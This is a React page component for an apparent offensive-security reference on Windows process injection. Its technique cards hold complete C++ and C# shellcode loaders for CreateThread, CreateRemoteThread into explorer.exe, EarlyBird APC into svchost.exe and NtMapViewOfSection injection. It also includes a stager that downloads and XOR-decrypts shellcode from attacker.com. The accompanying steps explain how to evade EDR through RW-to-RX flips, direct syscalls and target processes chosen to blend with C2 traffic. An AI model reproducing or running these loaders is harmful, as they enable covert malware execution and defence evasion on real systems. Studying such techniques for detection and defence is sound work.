import React, { useState } from 'react';
import TechniqueCard from '../components/TechniqueCard';
import MapNode from '../components/MapNode';
import AddCardModal from '../components/AddCardModal';
import { Plus, X } from 'lucide-react';

const initialMapColumns = [
  {
    header: 'LOCAL INJECTION',
    color: 'orange',
    nodes: [
      { title: 'CreateThread', subtitle: 'Local thread injection • C++ & C#', id: 'createthread' },
      { title: 'Downloading Shellcode', subtitle: 'HTTP fetch loaders', id: 'download' },
    ]
  },
  {
    header: 'REMOTE INJECTION',
    color: 'red',
    nodes: [
      { title: 'CreateRemoteThread', subtitle: 'Remote process injection', id: 'createremotethread' },
      { title: 'QueueUserAPC', subtitle: 'APC injection • EarlyBird', id: 'apc' },
    ]
  },
  {
    header: 'NT INJECTION',
    color: 'purple',
    nodes: [
      { title: 'NtMapViewOfSection', subtitle: 'Section-based injection', id: 'mapview' },
    ]
  },
];

const techniques = [
  {
    id: 'createthread',
    title: 'Local Thread Injection (CreateThread)',
    subtitle: 'Allocate and execute shellcode in the current process using a new thread',
    tags: ['CreateThread', 'VirtualAlloc', 'local injection', 'C++', 'C#'],
    accentColor: 'orange',
    overview: 'Local thread injection executes shellcode inside the current process — the simplest injection primitive. The key discipline is the RW → RX two-step to avoid EDR heuristics triggered by RWX allocations.',
    steps: [
      'Allocate RW memory in the current process with VirtualAlloc(NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) — never allocate RWX directly',
      'Copy shellcode bytes into the RW buffer with memcpy (C++) or Marshal.Copy (C#)',
      'Flip the page to RX with VirtualProtect(mem, size, PAGE_EXECUTE_READ, &old) — the two-step avoids EDR RWX heuristics',
      'Create a thread at the shellcode address with CreateThread or NtCreateThreadEx',
      'Wait for execution with WaitForSingleObject, then close the handle and VirtualFree the allocation',
    ],
    commands: [
      {
        title: 'Local injection C++ and C#',
        code: `// C++ local thread injection
#include <windows.h>
unsigned char shellcode[] = { /* your shellcode here */ };

int main() {
    // 1. Allocate RW memory
    LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    // 2. Copy shellcode
    memcpy(mem, shellcode, sizeof(shellcode));
    
    // 3. Change to RX (not RWX — avoids EDR heuristics)
    DWORD oldProt;
    VirtualProtect(mem, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProt);
    
    // 4. Create thread and execute
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    
    // Cleanup
    VirtualFree(mem, 0, MEM_RELEASE);
    CloseHandle(hThread);
    return 0;
}

// C# equivalent using P/Invoke
byte[] shellcode = new byte[] { /* shellcode */ };
IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x04); // RW
Marshal.Copy(shellcode, 0, mem, shellcode.Length);
uint oldProt;
VirtualProtect(mem, (uint)shellcode.Length, 0x20, out oldProt); // RX
IntPtr hThread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
WaitForSingleObject(hThread, 0xFFFFFFFF);`
      }
    ]
  },
  {
    id: 'download',
    title: 'Downloading Shellcode — Stager Loaders',
    subtitle: 'Fetch shellcode from a remote URL at runtime — keeps the initial loader clean',
    tags: ['stager', 'WinHTTP', 'URLDownloadToFile', 'C++ downloader', 'C# downloader', 'in-memory'],
    accentColor: 'orange',
    overview: 'A stager fetches shellcode at runtime from a remote URL, keeping the initial binary clean of any payload bytes. Combined with server-side encryption, the shellcode is never exposed to static analysis.',
    steps: [
      'Build a minimal loader binary that contains no shellcode — only a URL, a download function, and optional guardrails',
      'Run any environmental guardrails (domain check, IP range, uptime) before initiating the download',
      'Fetch shellcode directly into a heap/VirtualAlloc buffer using WinHTTP (C++) or WebClient.DownloadData (C#) — never write to disk',
      'Serve the shellcode from the redirector AES- or XOR-encrypted; decrypt in memory immediately after download',
      'Inject the decrypted shellcode using local CreateThread (RW → RX two-step) or any other injection primitive',
    ],
    commands: [
      {
        title: 'In-memory shellcode download and execute',
        code: `// C++ — download shellcode with WinHTTP (in-memory, no disk write)
#include <windows.h>
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")

std::vector<BYTE> DownloadShellcode(const wchar_t* host, const wchar_t* path) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, host, INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
    WinHttpReceiveResponse(hRequest, NULL);
    
    std::vector<BYTE> data;
    DWORD read = 0; BYTE buf[4096];
    while (WinHttpReadData(hRequest, buf, sizeof(buf), &read) && read > 0)
        data.insert(data.end(), buf, buf + read);
    
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    return data;
}

int main() {
    auto sc = DownloadShellcode(L"attacker.com", L"/update.bin");
    // Decrypt if needed (XOR, AES)
    // Then inject using any technique above
    return 0;
}

// C# — WebClient in-memory download
byte[] sc = new System.Net.WebClient().DownloadData("https://attacker.com/update.bin");
// XOR decrypt if encoded
for (int i = 0; i < sc.Length; i++) sc[i] ^= 0x41;
// Then: allocate, copy, protect, create thread (see CreateThread section)`
      }
    ]
  },
  {
    id: 'createremotethread',
    title: 'CreateRemoteThread — Remote Process Injection',
    subtitle: 'Inject shellcode into a remote process by creating a thread in its address space',
    tags: ['CreateRemoteThread', 'VirtualAllocEx', 'WriteProcessMemory', 'remote injection'],
    accentColor: 'red',
    overview: 'CreateRemoteThread is the classic cross-process injection primitive. It is heavily monitored by EDR — prefer NtCreateThreadEx via direct syscall for the thread creation step to avoid userland hooks.',
    steps: [
      'Select a target process whose network activity blends with C2 (browser, svchost, dllhost) — enumerate PIDs by name via Toolhelp32',
      'Open the process with minimum required rights: PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD',
      'Allocate RW memory in the remote process with VirtualAllocEx',
      'Write shellcode into the allocation with WriteProcessMemory, then flip to RX with VirtualProtectEx',
      'Create a remote thread at the shellcode address — use NtCreateThreadEx via direct syscall instead of CreateRemoteThread to bypass userland hooks',
      'Wait on the thread handle, then close both handles and free the remote allocation',
    ],
    commands: [
      {
        title: 'Remote thread injection',
        code: `// C++ CreateRemoteThread injection
#include <windows.h>
#include <tlhelp32.h>

DWORD GetPidByName(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) do {
        if (_stricmp(pe.szExeFile, name) == 0) { CloseHandle(snap); return pe.th32ProcessID; }
    } while (Process32Next(snap, &pe));
    CloseHandle(snap); return 0;
}

int main() {
    unsigned char sc[] = { /* shellcode */ };
    DWORD pid = GetPidByName("explorer.exe");
    
    // 1. Open target process
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    // 2. Allocate RW in target
    LPVOID remote = VirtualAllocEx(hProc, NULL, sizeof(sc), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    // 3. Write shellcode
    WriteProcessMemory(hProc, remote, sc, sizeof(sc), NULL);
    
    // 4. Change to RX
    DWORD old;
    VirtualProtectEx(hProc, remote, sizeof(sc), PAGE_EXECUTE_READ, &old);
    
    // 5. Create remote thread
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    
    CloseHandle(hThread); CloseHandle(hProc);
    return 0;
}`
      }
    ]
  },
  {
    id: 'apc',
    title: 'APC Injection & EarlyBird',
    subtitle: 'Queue an Asynchronous Procedure Call to execute shellcode in an alertable thread',
    tags: ['APC', 'QueueUserAPC', 'EarlyBird', 'NtQueueApcThread', 'alertable wait'],
    accentColor: 'red',
    overview: 'APC injection queues shellcode execution to run inside a target thread when it next enters an alertable wait state. EarlyBird is the cleanest variant — it injects before the process entry point, defeating hooks that initialise after startup.',
    steps: [
      'Create the target process in SUSPENDED state with CreateProcess(..., CREATE_SUSPENDED, ...)',
      'Allocate RW memory in the suspended process with VirtualAllocEx, write shellcode, flip to RX with VirtualProtectEx',
      'Queue an APC to the main thread with QueueUserAPC((PAPCFUNC)remoteAddr, pi.hThread, 0)',
      'Resume the thread with ResumeThread — the APC fires before the process entry point (EarlyBird variant)',
      'For existing processes: identify threads in alertable wait (SleepEx, WaitForSingleObjectEx) before queuing',
      'Use NtQueueApcThread via direct syscall instead of QueueUserAPC to bypass userland monitoring',
    ],
    commands: [
      {
        title: 'EarlyBird APC injection',
        code: `// EarlyBird APC injection — creates suspended process, injects, resumes
#include <windows.h>

unsigned char sc[] = { /* shellcode */ };

int main() {
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    // 1. Create process in SUSPENDED state
    CreateProcess(L"C:\\Windows\\System32\\svchost.exe", NULL,
        NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    // 2. Allocate RW in suspended process
    LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, sizeof(sc),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    // 3. Write shellcode
    WriteProcessMemory(pi.hProcess, mem, sc, sizeof(sc), NULL);
    
    // 4. Change to RX
    DWORD old;
    VirtualProtectEx(pi.hProcess, mem, sizeof(sc), PAGE_EXECUTE_READ, &old);
    
    // 5. Queue APC to main thread (before it even starts)
    QueueUserAPC((PAPCFUNC)mem, pi.hThread, 0);
    
    // 6. Resume thread — APC fires before entry point
    ResumeThread(pi.hThread);
    
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    return 0;
}`
      }
    ]
  },
  {
    id: 'mapview',
    title: 'NtMapViewOfSection — Section-Based Injection',
    subtitle: 'Share memory between processes via a section object for stealthy shellcode delivery',
    tags: ['NtMapViewOfSection', 'NtCreateSection', 'shared memory', 'section object', 'NT injection'],
    accentColor: 'purple',
    overview: 'Section-based injection uses shared memory objects to deliver shellcode without calling WriteProcessMemory — a cross-process write that many EDRs monitor. The shellcode appears in both processes simultaneously through the shared mapping.',
    steps: [
      'Create a pagefile-backed section with NtCreateSection(PAGE_EXECUTE_READWRITE) sized to the shellcode',
      'Map the section into the current process as PAGE_READWRITE with NtMapViewOfSection to get a local write view',
      'Copy shellcode to the local mapping — data immediately appears in all mapped views (no WriteProcessMemory call)',
      'Map the same section into the target process as PAGE_EXECUTE_READ with a second NtMapViewOfSection call',
      'Create a thread in the target process at the remote view address with NtCreateThreadEx',
      'Unmap the local view with NtUnmapViewOfSection and close the section handle to clean up',
    ],
    commands: [
      {
        title: 'NtMapViewOfSection injection',
        code: `// Section-based injection using NT APIs
#include <windows.h>
#include <winternl.h>

// NT API typedefs
typedef NTSTATUS (NTAPI* pNtCreateSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI* pNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS (NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS (NTAPI* pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

unsigned char sc[] = { /* shellcode */ };

int main() {
    HMODULE hNt = GetModuleHandleA("ntdll.dll");
    auto NtCreateSection = (pNtCreateSection)GetProcAddress(hNt, "NtCreateSection");
    auto NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNt, "NtMapViewOfSection");
    auto NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNt, "NtCreateThreadEx");
    
    // 1. Create RWX section (pagefile-backed)
    HANDLE hSection = NULL;
    LARGE_INTEGER size = {sizeof(sc)};
    NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    
    // 2. Map in current process (for writing)
    PVOID localView = NULL; SIZE_T viewSize = 0;
    NtMapViewOfSection(hSection, GetCurrentProcess(), &localView, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE);
    
    // 3. Copy shellcode to local view (appears in target too)
    memcpy(localView, sc, sizeof(sc));
    
    // 4. Map in target process (execute-only view)
    HANDLE hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    PVOID remoteView = NULL; viewSize = 0;
    NtMapViewOfSection(hSection, hTarget, &remoteView, 0, 0, NULL, &viewSize, 2, 0, PAGE_EXECUTE_READ);
    
    // 5. Execute in target
    HANDLE hThread = NULL;
    NtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hTarget, remoteView, NULL, FALSE, 0, 0, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}`
      }
    ]
  },
];

const colorOptions=[{value:'cyan',name:'Cyan'},{value:'green',name:'Green'},{value:'red',name:'Red'},{value:'purple',name:'Purple'},{value:'orange',name:'Orange'},{value:'pink',name:'Pink'},{value:'blue',name:'Blue'},{value:'yellow',name:'Yellow'}];
const colorPreview={cyan:'bg-cyan-500',green:'bg-emerald-500',red:'bg-red-500',purple:'bg-purple-500',orange:'bg-orange-500',pink:'bg-pink-500',blue:'bg-blue-500',yellow:'bg-yellow-500'};
const headerColorMap={cyan:'text-cyan-400 border-cyan-500/30',green:'text-emerald-400 border-emerald-500/30',red:'text-red-400 border-red-500/30',purple:'text-purple-400 border-purple-500/30',orange:'text-orange-400 border-orange-500/30',pink:'text-pink-400 border-pink-500/30',blue:'text-blue-400 border-blue-500/30',yellow:'text-yellow-400 border-yellow-500/30'};

export default function ProcessInjection() {
  const [columns,setColumns]=useState(initialMapColumns);
  const [modalStep,setModalStep]=useState(null);
  const [columnName,setColumnName]=useState('');
  const [selectedColor,setSelectedColor]=useState('cyan');
  const [addingTopicCol,setAddingTopicCol]=useState(null);
  const [topicTitle,setTopicTitle]=useState('');
  const [topicTags,setTopicTags]=useState('');
  const [customCards,setCustomCards]=useState([]);
  const [cardModalOpen,setCardModalOpen]=useState(false);
  const handleAddColumnStart=()=>setModalStep('name');
  const handleNameSubmit=()=>{if(columnName.trim())setModalStep('color');};
  const handleColorSubmit=()=>{setColumns([...columns,{header:columnName.toUpperCase(),color:selectedColor,nodes:[]}]);setModalStep(null);setSelectedColor('cyan');setColumnName('');};
  const handleDeleteColumn=(i)=>setColumns(columns.filter((_,idx)=>idx!==i));
  const handleAddTopic=(ci)=>{if(topicTitle.trim()){const u=[...columns];u[ci].nodes.push({title:topicTitle,subtitle:'Add details here',tags:topicTags.split(',').map(t=>t.trim()).filter(t=>t)});setColumns(u);setAddingTopicCol(null);setTopicTitle('');setTopicTags('');}};
  const handleDeleteTopic=(ci,ni)=>{const u=[...columns];u[ci].nodes.splice(ni,1);setColumns(u);};
  const handleAddCard=(card)=>setCustomCards([...customCards,card]);
  const handleDeleteCard=(id)=>setCustomCards(customCards.filter(c=>c.id!==id));
  const scrollTo=(id)=>{const el=document.getElementById(id);if(el)el.scrollIntoView({behavior:'smooth',block:'start'});};
  return (
    <div className="space-y-12">
      <div className="text-center mb-10">
        <h1 className="text-3xl md:text-5xl font-bold font-mono tracking-tight"><span className="text-slate-200">Process </span><span className="text-orange-400">Injection</span></h1>
        <p className="text-slate-500 font-mono text-sm mt-3">CreateThread • CreateRemoteThread • APC/EarlyBird • NtMapViewOfSection • Stagers</p>
      </div>
      <div className="overflow-x-auto pb-4"><div className="inline-flex gap-4 min-w-max">
        {columns.map((col,i)=>{const color=col.color||'cyan';return(
          <div key={i} className="flex flex-col gap-2 min-w-[180px] max-w-[200px] relative">
            <div className={`text-center py-2 border-b-2 mb-2 ${headerColorMap[color]} flex items-center justify-between px-2`}>
              <span className="font-mono text-[11px] font-bold tracking-[0.2em] uppercase flex-1">{col.header}</span>
              <button onClick={()=>handleDeleteColumn(i)} className="text-slate-500 hover:text-slate-300 p-0.5"><X className="w-3 h-3"/></button>
            </div>
            <div className="flex flex-col gap-2 border border-slate-800/50 rounded-lg p-2 bg-[#0d1117]">
              {col.nodes.map((node,j)=>(<div key={j} className="flex items-start gap-1 group"><div className="flex-1 min-w-0"><MapNode title={node.title} subtitle={node.tags&&node.tags.length>0?node.tags.join(' • '):node.subtitle} accentColor={color} onClick={()=>scrollTo(node.id)} small/></div><button onClick={()=>handleDeleteTopic(i,j)} className="text-slate-600 hover:text-red-400 p-0.5 flex-shrink-0 opacity-0 group-hover:opacity-100"><X className="w-3 h-3"/></button></div>))}
              {addingTopicCol===i?(<div className="flex flex-col gap-1"><input type="text" value={topicTitle} onChange={e=>setTopicTitle(e.target.value)} placeholder="Topic name" className="px-2 py-1 bg-slate-800 border border-slate-700 rounded text-slate-200 placeholder-slate-500 font-mono text-xs focus:outline-none" autoFocus onKeyDown={e=>{if(e.key==='Escape'){setAddingTopicCol(null);setTopicTitle('');setTopicTags('');}}}/>
              <input type="text" value={topicTags} onChange={e=>setTopicTags(e.target.value)} placeholder="Tags (comma-separated)" className="px-2 py-1 bg-slate-800 border border-slate-700 rounded text-slate-200 placeholder-slate-500 font-mono text-xs focus:outline-none" onKeyDown={e=>{if(e.key==='Enter')handleAddTopic(i);if(e.key==='Escape'){setAddingTopicCol(null);setTopicTitle('');setTopicTags('');}}}/>
              <div className="flex gap-1"><button onClick={()=>handleAddTopic(i)} className="flex-1 px-2 py-1 bg-orange-600 hover:bg-orange-700 text-white text-xs font-mono rounded">Add</button><button onClick={()=>{setAddingTopicCol(null);setTopicTitle('');setTopicTags('');}} className="flex-1 px-2 py-1 bg-slate-700 hover:bg-slate-600 text-slate-300 text-xs font-mono rounded">Cancel</button></div></div>
              ):(<button onClick={()=>setAddingTopicCol(i)} className="px-2 py-1 text-xs font-mono text-slate-500 hover:text-slate-300 border border-dashed border-slate-700 rounded hover:border-slate-500">+ Add Topic</button>)}
            </div>
          </div>
        );})}
        <div className="flex flex-col gap-2 min-w-[180px] max-w-[200px]"><button onClick={handleAddColumnStart} className="h-full flex flex-col items-center justify-center gap-2 border-2 border-dashed border-slate-700 rounded-lg p-4 hover:border-slate-500 hover:bg-slate-800/20"><Plus className="w-6 h-6 text-slate-500"/><span className="text-xs font-mono text-slate-500 text-center">Add Column</span></button></div>
      </div></div>
      {modalStep&&(<div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50"><div className="bg-[#0d1117] border border-slate-800 rounded-lg p-6 max-w-sm w-full mx-4">
        {modalStep==='name'&&(<div className="space-y-4"><h3 className="text-lg font-mono font-bold text-slate-200">Column Name</h3><input type="text" value={columnName} onChange={e=>setColumnName(e.target.value)} placeholder="e.g., Custom Category" className="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-slate-200 placeholder-slate-500 font-mono text-sm focus:outline-none" autoFocus onKeyDown={e=>e.key==='Enter'&&handleNameSubmit()}/><div className="flex gap-2"><button onClick={()=>setModalStep(null)} className="flex-1 px-4 py-2 bg-slate-800 text-slate-300 rounded-lg hover:bg-slate-700 font-mono text-sm">Cancel</button><button onClick={handleNameSubmit} className="flex-1 px-4 py-2 bg-orange-600 text-white rounded-lg hover:bg-orange-700 font-mono text-sm font-semibold">Next</button></div></div>)}
        {modalStep==='color'&&(<div className="space-y-4"><h3 className="text-lg font-mono font-bold text-slate-200">Choose Color</h3><div className="flex flex-col gap-2 max-h-64 overflow-y-auto">{colorOptions.map(o=>(<button key={o.value} onClick={()=>setSelectedColor(o.value)} className={`px-4 py-2 rounded-lg text-sm font-mono font-semibold flex items-center gap-2 ${selectedColor===o.value?`${colorPreview[o.value]} text-slate-900`:'bg-slate-800 text-slate-300 hover:bg-slate-700'}`}><div className={`w-3 h-3 rounded-full ${colorPreview[o.value]}`}/>{o.name}</button>))}</div><div className="flex gap-2"><button onClick={()=>setModalStep('name')} className="flex-1 px-4 py-2 bg-slate-800 text-slate-300 rounded-lg hover:bg-slate-700 font-mono text-sm">Back</button><button onClick={handleColorSubmit} className="flex-1 px-4 py-2 bg-orange-600 text-white rounded-lg hover:bg-orange-700 font-mono text-sm font-semibold">Create</button></div></div>)}
      </div></div>)}
      <div><button onClick={()=>setCardModalOpen(true)} className="px-3 py-1.5 bg-orange-600 hover:bg-orange-700 text-white text-xs font-mono rounded flex items-center gap-1"><Plus className="w-3 h-3"/> Add Technique</button></div>
      {customCards.length>0&&(<div className="border-t border-slate-800/50 pt-8"><h2 className="text-xl font-bold font-mono text-slate-200 mb-4">Custom Techniques</h2><div className="grid grid-cols-1 gap-4">{customCards.map(card=>(<div key={card.id} className="relative"><TechniqueCard title={card.title} subtitle={card.subtitle} tags={card.tags} accentColor={card.accentColor} overview={card.overview} steps={card.steps} commands={card.commands}/><button onClick={()=>handleDeleteCard(card.id)} className="absolute top-4 right-4 text-slate-600 hover:text-red-400 p-1 z-10"><X className="w-4 h-4"/></button></div>))}</div></div>)}
      <AddCardModal isOpen={cardModalOpen} onClose={()=>setCardModalOpen(false)} onSubmit={handleAddCard}/>
      <div className="border-t border-slate-800/50 pt-10 grid grid-cols-1 gap-4">{techniques.map((t)=>(<div key={t.id} id={t.id}><TechniqueCard title={t.title} subtitle={t.subtitle} tags={t.tags} accentColor={t.accentColor} overview={t.overview} steps={t.steps} commands={t.commands}/></div>))}</div>
    </div>
  );
}